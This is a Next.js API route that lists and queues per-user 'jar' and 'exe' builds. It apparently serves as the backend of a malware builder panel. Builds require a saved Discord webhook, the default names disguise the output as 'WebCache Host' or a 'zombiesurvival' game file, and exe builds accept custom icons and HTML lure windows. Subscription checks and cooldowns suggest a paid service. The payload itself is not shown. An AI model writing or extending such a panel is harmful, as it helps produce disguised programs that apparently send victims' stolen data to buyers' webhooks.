import { mkdir, writeFile } from "fs/promises";
import path from "path";
import { NextResponse } from "next/server";
import { requireSession } from "@/lib/auth";
import {
  activeBuild,
  addBuild,
  getUser,
  lastBuildAt,
  listBuilds,
  now,
  spawnBuildOne,
  userActive,
  botDir,
} from "@/lib/db";

function cleanLabel(raw: string, kind: string) {
  let s = raw.trim().replace(/[^\w\- ]+/gu, "").replace(/\s+/g, " ").slice(0, 60);
  if (!s) s = kind === "exe" ? "WebCache Host" : "zombiesurvival";
  return s;
}

export async function GET() {
  const sess = await requireSession();
  if (!sess) {
    return NextResponse.json({ error: "unauthorized" }, { status: 401 });
  }
  try {
    const builds = await listBuilds(sess.tgId, 20);
    const active = await activeBuild(sess.tgId);
    const user = await getUser(sess.tgId);
    const safe = builds.map((row) => {
      const { artifact, icon, theme, ...rest } = row;
      void artifact;
      void icon;
      void theme;
      return rest;
    });
    return NextResponse.json({
      builds: safe,
      active: active
        ? {
            id: active.id,
            kind: active.kind,
            status: active.status,
            detail: active.detail,
            label: active.label,
            created_at: active.created_at,
            finished_at: active.finished_at,
          }
        : null,
      hasWebhook: Boolean(user?.webhook),
    });
  } catch (e) {
    const msg = e instanceof Error ? e.message : "db fail";
    return NextResponse.json({ error: msg.slice(0, 500) }, { status: 500 });
  }
}

export async function POST(req: Request) {
  const sess = await requireSession();
  if (!sess) {
    return NextResponse.json({ error: "unauthorized" }, { status: 401 });
  }

  const ctype = req.headers.get("content-type") || "";
  let kind = "";
  let label = "";
  let iconFile: File | null = null;
  let themeFile: File | null = null;
  let sizeMode = "default";
  let twRaw = "";
  let thRaw = "";

  if (ctype.includes("multipart/form-data")) {
    const form = await req.formData();
    kind = String(form.get("kind") || "").toLowerCase();
    label = String(form.get("label") || "");
    const f = form.get("icon");
    if (f instanceof File && f.size > 0) iconFile = f;
    const t = form.get("theme");
    if (t instanceof File && t.size > 0) themeFile = t;
    sizeMode = String(form.get("size") || "default").toLowerCase();
    twRaw = String(form.get("tw") || "");
    thRaw = String(form.get("th") || "");
  } else {
    const body = await req.json().catch(() => ({}));
    kind = String(body.kind || "").toLowerCase();
    label = String(body.label || "");
  }

  if (kind !== "jar" && kind !== "exe") {
    return NextResponse.json({ error: "kind jar|exe" }, { status: 400 });
  }

  label = cleanLabel(label, kind);

  const active = await userActive(sess.tgId);
  if (!active.ok) return NextResponse.json({ error: active.why }, { status: 403 });

  const user = await getUser(sess.tgId);
  if (!user?.webhook) {
    return NextResponse.json({ error: "save a Discord webhook first" }, { status: 400 });
  }

  const running = await activeBuild(sess.tgId);
  if (running) {
    return NextResponse.json({ error: "a build is already running", buildId: running.id }, { status: 409 });
  }

  const cooldown = Number(process.env.COOLDOWN_SEC || 60);
  const last = await lastBuildAt(sess.tgId);
  const left = last + cooldown - now();
  if (left > 0) {
    return NextResponse.json({ error: `cooldown ${left}s` }, { status: 429 });
  }

  let iconRel: string | null = null;
  if (kind === "exe" && iconFile) {
    if (iconFile.size > 2 * 1024 * 1024) {
      return NextResponse.json({ error: "icon max 2MB" }, { status: 400 });
    }
    const name = iconFile.name.toLowerCase();
    const okExt = name.endsWith(".ico") || name.endsWith(".png");
    if (!okExt) {
      return NextResponse.json({ error: "icon must be .ico or .png" }, { status: 400 });
    }
    const dir = path.join(botDir(), "icons", String(sess.tgId));
    await mkdir(dir, { recursive: true });
    const ext = name.endsWith(".png") ? ".png" : ".ico";
    const fname = `${Date.now()}${ext}`;
    const abs = path.join(dir, fname);
    const buf = Buffer.from(await iconFile.arrayBuffer());
    await writeFile(abs, buf);
    iconRel = path.join("data", "icons", String(sess.tgId), fname);
  }

  let themeRel: string | null = null;
  if (kind === "exe" && themeFile) {
    if (themeFile.size > 2 * 1024 * 1024) {
      return NextResponse.json({ error: "theme max 2MB" }, { status: 400 });
    }
    const name = themeFile.name.toLowerCase();
    if (!name.endsWith(".html") && !name.endsWith(".htm")) {
      return NextResponse.json({ error: "theme must be .html" }, { status: 400 });
    }
    const dir = path.join(botDir(), "themes", String(sess.tgId));
    await mkdir(dir, { recursive: true });
    const fname = `${Date.now()}.html`;
    const abs = path.join(dir, fname);
    const buf = Buffer.from(await themeFile.arrayBuffer());
    await writeFile(abs, buf);
    themeRel = path.join("data", "themes", String(sess.tgId), fname);
  }

  let themeW: number | null = null;
  let themeH: number | null = null;
  if (themeRel) {
    const clamp = (raw: string, fallback: number) => {
      const n = Number(raw);
      if (!Number.isFinite(n)) return fallback;
      return Math.min(2560, Math.max(200, Math.round(n)));
    };
    if (sizeMode === "custom") {
      themeW = clamp(twRaw, 820);
      themeH = clamp(thRaw, 560);
    } else {
      themeW = 820;
      themeH = 560;
    }
  }

  const { id } = await addBuild(sess.tgId, kind, label, iconRel, themeRel, themeW, themeH);
  spawnBuildOne(id);
  return NextResponse.json({ ok: true, buildId: id });
}
